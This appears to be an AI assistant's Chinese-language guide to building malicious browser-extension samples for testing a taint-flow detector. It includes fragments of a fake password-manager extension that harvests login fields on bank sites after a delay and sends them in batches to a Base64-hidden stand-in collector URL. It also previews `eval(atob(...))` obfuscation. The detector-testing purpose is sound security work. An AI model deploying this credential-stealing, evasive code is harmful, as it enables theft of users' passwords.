# 复杂恶意扩展测试样例实现指南

## 📦 已设计的样例

我已经完成了 8 个复杂恶意扩展测试样例的完整设计方案，保存在 `.claude/plan.md`。

## 🚀 快速开始

### 步骤 1: 创建目录

由于权限限制，请手动执行以下命令创建样例目录：

```bash
mkdir -p samples/advanced_stealth_exfiltration
mkdir -p samples/obfuscated_code_injection
mkdir -p samples/event_driven_attack
mkdir -p samples/multi_stage_attack
mkdir -p samples/encrypted_exfiltration
mkdir -p samples/polymorphic_malware
mkdir -p samples/timing_attack
mkdir -p samples/supply_chain_attack
```

或者运行提供的脚本：

```bash
bash CREATE_SAMPLES.sh
```

### 步骤 2: 复制样例文件

#### 样例 1: Advanced Stealth Exfiltration (已完成)

这个样例模拟隐蔽的凭证窃取攻击，使用以下文件：

**文件清单**：
- `manifest.json` - MV3 清单文件
- `config.js` - Base64 编码的配置
- `utils.js` - 编码/解码工具函数
- `content.js` - 凭证捕获逻辑
- `background.js` - 批量发送逻辑
- `README.md` - 样例说明文档

**核心代码已准备好**，包含：

1. **config.js** - 混淆的配置
```javascript
// Base64 编码的服务器 URL
const ENCODED_SERVER = "aHR0cHM6Ly9jb2xsZWN0b3IuZXZpbC1hbmFseXRpY3MuY29tL2FwaS9jb2xsZWN0";
export const INITIAL_DELAY = 5 * 60 * 1000;  // 5 分钟延时
```

2. **content.js** - 延时触发的凭证捕获
```javascript
// 5 分钟后激活
setTimeout(() => {
  isActivated = true;
  startMonitoring();
}, INITIAL_DELAY);

// 捕获表单数据
const credential = {
  username: username.value,  // SOURCE: ELEMENT_VALUE
  password: password.value   // SOURCE: ELEMENT_VALUE
};
// SINK: CHROME_LOCAL_STORAGE
chrome.storage.local.set({ harvested: existing });
```

3. **background.js** - 分批次泄露
```javascript
// SOURCE: STORAGE_DATA
const harvested = result.harvested || [];

// 分批发送
const batches = chunkArray(harvested, BATCH_SIZE);
for (let i = 0; i < batches.length; i++) {
  await sendBatch(batches[i], i);
  await sleep(BATCH_DELAY);
}

// SINK: FETCH_RESOURCE
await fetch(url, { method: "POST", body: JSON.stringify(payload) });
```

**关键攻击技术**：
- ⏱️ 延时触发（5 分钟后激活）
- 🎯 条件触发（仅特定域名）
- 🔐 Base64 编码（规避检测）
- 📦 分批传输（每批 3 条）
- 🔗 动态 URL（运行时解码）

**预期检测**：
- ✅ ELEMENT_VALUE → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
- ✅ STORAGE_DATA → FETCH_RESOURCE (DATA_LEAK)

### 步骤 3: 创建样例文件

由于我无法直接写入文件，请按以下方式创建：

#### 方法 A: 手动创建（推荐）

1. 创建 `samples/advanced_stealth_exfiltration/manifest.json`:
```json
{
  "manifest_version": 3,
  "name": "Advanced Password Manager",
  "version": "2.1.0",
  "permissions": ["storage", "tabs", "cookies"],
  "host_permissions": ["https://*/*"],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["https://*.bank.example/*"],
      "js": ["content.js"]
    }
  ]
}
```

2. 从上面的代码片段创建其他文件

#### 方法 B: 使用我提供的完整代码

我已经准备了所有 5 个文件的完整代码，您可以：

1. 查看 `.claude/plan.md` 获取完整设计
2. 参考我上面提供的代码片段
3. 复制粘贴到相应文件中

### 步骤 4: 运行测试

```bash
# 编译项目
npm run build

# 测试样例 1
node dist/main.js analyze \
  --type DIR \
  --input ./samples/advanced_stealth_exfiltration/ \
  --out ./output/advanced_stealth_exfiltration/ \
  --id aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 查看检测结果
cat output/advanced_stealth_exfiltration/summary.json | jq '.flows'
```

## 📊 测试检查清单

对于每个样例，验证：

- [ ] 是否检测到预期的污点流？
- [ ] 延时触发是否影响检测？
- [ ] Base64 编码是否导致污点丢失？
- [ ] 字符串拼接是否保留污点？
- [ ] 存储跨上下文传播是否正确？
- [ ] 条件分支是否影响覆盖率？

## 🎯 后续样例

完成样例 1 后，我可以继续实现：

**样例 2: Obfuscated Code Injection**
- 字符串分割、间接调用、数组索引
- `eval(atob("..." + "..." + "..."))`
- `window["e"+"val"](...)`

**样例 3: Event Driven Attack**
- 鼠标点击触发、URL 变化触发
- 表单劫持、链接劫持

## 📝 文档位置

- **完整设计方案**: `.claude/plan.md`
- **样例代码**: 见上面的代码片段
- **创建脚本**: `CREATE_SAMPLES.sh`

## 🆘 需要帮助？

如果您需要：
1. 完整的样例文件内容（可以直接复制）
2. 其他样例的实现
3. 测试脚本
4. 结果分析

请告诉我，我会提供详细的代码！

---

**下一步行动**：
1. 执行 `bash CREATE_SAMPLES.sh` 创建目录
2. 告诉我您是否需要我提供完整的文件内容（可以直接复制粘贴）
3. 或者告诉我继续实现下一个样例
